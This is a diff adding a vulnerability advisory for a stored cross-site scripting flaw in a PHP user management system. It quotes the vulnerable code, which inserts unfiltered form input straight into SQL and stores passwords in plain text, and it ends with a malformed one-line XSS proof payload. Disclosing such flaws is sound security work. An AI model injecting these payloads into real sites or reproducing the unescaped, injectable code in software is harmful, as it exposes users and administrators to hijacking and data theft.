@@ -1,0 +1,50 @@
+# Exploit Title: User Management System 2.0 - Persistent Cross-Site Scripting
+# Author: Besim ALTINOK
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/
+# Version: v2.0
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+
+------ Details:
+
+1- Vulnerable code is here:
+
+Insert user registration information to the DB without filtering.
+
+if(isset($_POST['signup']))
+{
+$fname=$_POST['fname'];
+$lname=$_POST['lname'];
+$email=$_POST['email'];
+$password=$_POST['password'];
+$contact=$_POST['contact'];
+$enc_password=$password;
+$msg=mysqli_query($con,"insert into
+users(fname,lname,email,password,contactno)
+values('$fname','$lname','$email','$enc_password','$contact')");
+if($msg)
+{
+echo "<script>alert('Register successfully');</script>";
+}
+}
+
+2- In the admin dashboard:
+
+Get fullName from DB and print it without any filtering
+
+<?php $ret=mysqli_query($con,"select * from users");
+$cnt=1;
+while($row=mysqli_fetch_array($ret))
+{?>
+<tr>
+<td><?php echo $cnt;?></td>
+<td><?php echo $row['fname'];?></td>
+<td><?php echo $row['lname'];?></td>
+<td><?php echo $row['email'];?></td>
+<td><?php echo $row['contactno'];?></td> <td><?php echo
+$row['posting_date'];?></td>
+</tr>
+
+4- If we insert value of the "fname" as "script>prompt(1)</script>", we can
+perform this attack as "Stored XSS"
